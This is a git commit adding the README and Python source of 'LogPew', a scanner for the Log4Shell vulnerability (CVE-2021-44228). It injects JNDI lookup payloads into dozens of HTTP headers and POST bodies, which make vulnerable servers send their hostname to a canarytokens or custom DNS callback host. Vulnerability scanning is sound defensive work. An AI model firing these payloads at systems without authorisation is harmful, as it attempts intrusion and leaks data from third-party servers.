2896753eaefc03578dcf35e8594320b333fae7cc
0xInfection <theinfecteddrake@gmail.com>
2021-12-15 17:39:27 +0530

    added files

---
+++ README.md
@@ -0,0 +1,67 @@
+# LogPew
+An automated, reliable scanner for the Log4Shell CVE-2021-44228 vulnerability.
+
+### Usage
+Here the help usage:
+```js
+$ python3 logpew.py --help
+
+              L o g P e w
+
+    A Log4Shell (CVE-2021-44228) Scanner
+
+[-] You have to supply at least a single host to scan!
+usage: logpew.py [-h] [-u URL] [-f FILE] [-d DELAY] [-t TIMEOUT] [-T TOKEN] [-E EMAIL] [-W WEBHOOK] [-S SERVER] [-ua USERAGENT] [-m METHOD] [-H HEADERS] [-p PROXY]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     URL to probe for the vulnerability.
+  -f FILE, --file FILE  Specify a file containing list of hosts to scan.
+  -d DELAY, --delay DELAY
+                        Delay in-between two concurrent requests.
+  -t TIMEOUT, --timeout TIMEOUT
+                        Scan timeout for a single host.
+  -T TOKEN, --token TOKEN
+                        Canary token to use in payloads for scanning.
+  -E EMAIL, --email EMAIL
+                        Email to receive notifications.
+  -W WEBHOOK, --webhook WEBHOOK
+                        Webhook URL to receive notifications.
+  -S SERVER, --server SERVER
+                        Custom DNS callback server for receiving notifications.
+  -ua USERAGENT, --user-agent USERAGENT
+                        Custom user agent string to use for requests.
+  -m METHOD, --methods METHOD
+                        Comma separated list of HTTP Method to use
+  -H HEADERS, --headers HEADERS
+                        Comma separated list of custom HTTP headers to use.
+  -p PROXY, --proxy PROXY
+                        HTTP proxy to use (if any).
+```
+
+#### Getting a token
+The tool makes use of Log4Shell tokens from [Canary Tokens](https://canarytokens.org). The tool has capability to automatically generate tokens, if the values of the token (`--token`) and server (`--server`) are empty.
+
+#### Targets specification
+You can specify the targets in two modes:
+```
+./logpew.py -u 1.2.3.4:8080 -S alerts.mycallback.server
+./logpew.py -f targets.txt
+```
+
+#### Specifying notification channels
+There are two ways in which you can receive notification channels:
+- email (`--email`) -- service provided by Canarytokens.
+- webhook (`--webhook`) -- service provided by Canarytokens.
+- custom server (`--server`) -- you own custom DNS callback server.
+
+#### Sending requests
+- You can customize the HTTP methods using `--methods`.
+- A custom set of HTTP headers can be specified via `--headers` respectively.
+- A custom user agent can be specified using `--user-agent` header.
+- You can specfy a custom timeout value using `--timeout`.
+- You can specify custom proxies to use in HTTP requests via `--proxy`.
+
+#### Specifying delay
+
+Since a lot of HTTP requests are involved, it might be a cumbersome job for the remote host to handle the requests. The `--delay` parameter is here to help you with those cases. You can specify a delay value in seconds -- which will be used be used in between two subsequent requests to the same port on a server.
---
+++ logpew.py
@@ -0,0 +1,265 @@
+import os, sys, datetime, time
+import argparse, requests, urllib3, json
+
+delay = 0
+timeout = 7
+proxies = dict()
+allhosts = list()
+methods = ['GET']
+default_headers = [
+    "A-IM", "Accept", "Accept-Charset", "Accept-Datetime", "Accept-Encoding",
+    "Accept-Language", "Access-Control-Request-Method", "Access-Control-Request-Headers",
+    "Authorization", "Cache-Control", "Content-Encoding", "Content-MD5", "Content-Type",
+    "Cookie", "Date", "Expect", "Forwarded", "From", "HTTP2-Settings", "If-Match",
+    "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since",
+    "Max-Forwards", "Origin", "Pragma", "Prefer", "Proxy-Authorization", "Range", "Referer",
+    "TE", "Trailer", "Transfer-Encoding", "User-Agent", "Upgrade", "Via", "Warning",
+    "Upgrade-Insecure-Requests", "X-Requested-With", "DNT", "X-Forwarded-For", "X-Correlation-ID",
+    "X-Forwarded-Host", "X-Forwarded-Proto", "Front-End-Https", "X-ATT-DeviceId",
+    "X-Wap-Profile", "Proxy-Connection", "X-UIDH", "X-Csrf-Token", "X-Request-ID", "X-Api-Version",
+]
+custom_payload = r"${jndi:dns://${hostname}.%s}"
+canary_payload = r"${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_token(email: str, webhook: str):
+    '''
+    Generate a token automatically
+    '''
+    if not email:
+        email = ''
+    if not webhook:
+        webhook = ''
+    hbody = '''------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="type"
+
+log4shell
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="email"
+
+%s
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="webhook"
+
+%s
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="fmt"
+
+
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="memo"
+
+[LogPew] Log4Shell Token Triggered!
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="clonedsite"
+
+
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="sql_server_table_name"
+
+TABLE1
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="sql_server_view_name"
+
+VIEW1
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="sql_server_function_name"
+
+FUNCTION1
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="sql_server_trigger_name"
+
+TRIGGER1
+------WebKitFormBoundaryTTwFOEyKMZZffBne
+Content-Disposition: form-data; name="redirect_url"
+
+
+------WebKitFormBoundaryTTwFOEyKMZZffBne--''' % (email, webhook)
+    hheaders = {
+        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+		"Accept":           "application/json, text/javascript, */*; q=0.01",
+        "Content-Type":     "multipart/form-data; boundary=----WebKitFormBoundaryTTwFOEyKMZZffBne",
+		"X-Requested-With": "XMLHttpRequest",
+		"Origin":           "https://canarytokens.org",
+		"Accept-Encoding":  "gzip, deflate, br",
+		"Accept-Language":  "en-GB,en-US;q=0.9,en;q=0.8",
+		"Referer":          "https://canarytokens.org/generate",
+		"Sec-Fetch-Site":   "same-origin",
+		"Sec-Fetch-Mode":   "cors",
+		"Sec-Fetch-Dest":   "empty",
+	}
+    try:
+        resp = requests.post(
+            'http://canarytokens.org/generate',
+            data=hbody,
+            proxies=proxies,
+            headers=hheaders,
+            timeout=5,
+            verify=False
+        )
+    except requests.exceptions.RequestException as err:
+        sys.exit('Error getting Canary Token:', err.__str__())
+
+    if resp is not None:
+        with open('canary-token.json', 'w') as wf:
+            json.dump(resp.json(), wf, indent=2)
+
+        return resp.json()['Token'], resp.json()['Auth']
+
+def gen_headers(payload: str, headers: str, user_agent: str):
+    '''
+    Generates request headers with payloads
+    '''
+    xheaders = dict()
+    if not headers:
+        for xhead in default_headers:
+            xheaders[xhead] = payload
+    else:
+        for xhead in headers.split(','):
+            xheaders[xhead.strip()] = payload
+    if user_agent:
+        xheaders['User-Agent'] = user_agent
+    return xheaders
+
+def gen_post_data(payload: str):
+    '''
+    Generates body based payload for POST requests
+    '''
+    return {'s': payload}
+
+def scan_host(host: str, headers: dict, params: dict):
+    '''
+    Scans a single host for the vulnerability
+    '''
+    for method in methods:
+        if method == 'POST' or method == 'PUT' or method == 'PATCH':
+            try:
+                requests.request(
+                    method=method,
+                    url=host,
+                    params=params,
+                    data=params,
+                    headers=headers,
+                    timeout=timeout,
+                    proxies=proxies,
+                    verify=False
+                )
+                time.sleep(delay)
+            except requests.exceptions.RequestException as err:
+                continue
+        else:
+            try:
+                requests.request(
+                    method=method,
+                    url=host,
+                    params=params,
+                    headers=headers,
+                    timeout=timeout,
+                    proxies=proxies,
+                    verify=False
+                )
+                time.sleep(delay)
+            except requests.exceptions.RequestException:
+                continue
+
+def main():
+    print('''
+              L o g P e w
+
+    A Log4Shell (CVE-2021-44228) Scanner
+    ''')
+    parser = argparse.ArgumentParser(prog='logpew.py')
+    parser.add_argument('-u', '--url', dest='url', type=str, help='URL to probe for the vulnerability.')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='Specify a file containing list of hosts to scan.')
+    parser.add_argument('-d', '--delay', dest='delay', type=str, help='Delay in-between two concurrent requests.')
+    parser.add_argument('-t', '--timeout', dest='timeout', type=int, help='Scan timeout for a single host.')
+    parser.add_argument('-T', '--token', dest='token', type=str, help='Canary token to use in payloads for scanning.')
+    parser.add_argument('-E', '--email', dest='email', type=str, help='Email to receive notifications.')
+    parser.add_argument('-W', '--webhook', dest='webhook', type=str, help='Webhook URL to receive notifications.')
+    parser.add_argument('-S', '--server', dest='server', type=str, help='Custom DNS callback server for receiving notifications.')
+    parser.add_argument('-ua', '--user-agent', dest='useragent', type=str, help='Custom user agent string to use for requests.')
+    parser.add_argument('-m', '--methods', dest='method', type=str, help='Comma separated list of HTTP Method to use')
+    parser.add_argument('-H', '--headers', dest='headers', help='Comma separated list of custom HTTP headers to use.')
+    parser.add_argument('-p', '--proxy', dest='proxy', help='HTTP proxy to use (if any).')
+
+    args = parser.parse_args()
+
+    if args.url:
+        allhosts.append(args.url)
+
+    if args.file:
+        if not os.path.exists(args.file):
+            print('[-] File %s doesn\'t exist!' % args.file)
+            parser.print_help(sys.stdout)
+            sys.exit(1)
+        else:
+            with open(args.file, 'r') as rf:
+                allhosts.extend(rf.read().splitlines())
+
+    if len(allhosts) < 1:
+        print('[-] You have to supply at least a single host to scan!')
+        parser.print_help(sys.stdout)
+        sys.exit(1)
+
+    if args.delay:
+        global delay
+        delay = args.delay
+
+    if args.timeout:
+        global timeout
+        timeout = args.timeout
+
+    if args.method:
+        global methods
+        methods = list(set(
+            [i.upper().strip() for i in args.method.split(',')]
+            )
+        )
+
+    if args.proxy:
+        global proxies
+        proxies = {
+            "http":  args.proxy,
+            "https": args.proxy
+        }
+
+    xpayload, authtoken = '', ''
+    if args.server:
+        xpayload = custom_payload % args.server
+
+    if args.token:
+        xpayload = canary_payload % args.token
+
+    if len(xpayload) < 1:
+        print('[-] No canarytokens or server given. Generating a new payload...')
+        if not args.email or args.webhook:
+            print('[-] You have to supply either an email or a webhook if not mentioning a canarytoken or a custom server!')
+            parser.print_help()
+            sys.exit(1)
+        ctoken, authtoken = get_token(args.email, args.webhook)
+        xpayload = canary_payload % ctoken
+        print('[-] Got a new canarytoken:', ctoken)
+
+    xheaders = gen_headers(xpayload, args.headers, args.useragent)
+    xbody = gen_post_data(xpayload)
+
+    tnow = datetime.datetime.now()
+    print('[+] Started scan at:', tnow.strftime("%m/%d/%Y, %H:%M:%S"))
+
+    for host in allhosts:
+        if not '://' in host:
+            host = 'http://%s' % host
+        print('[*] Processing:', host)
+        scan_host(host, xheaders, xbody)
+
+    tfin = datetime.datetime.now()
+    print('[+] Scan finished at:', tfin.strftime("%m/%d/%Y, %H:%M:%S"))
+    print('[+] Please check your canarytoken history / callback server for DNS triggers from vulnerable hosts.')
+    if len(authtoken) > 0:
+        print('[+] Visit "%s" for viewing callbacks!' %
+            f'https://canarytokens.org/history?token={ctoken}&auth={authtoken}')
+    print('[+] Total time taken: %ss' % (tfin-tnow).total_seconds())
+    print('[*] Done. Exiting...')
+
+if __name__ == '__main__':
+    main()
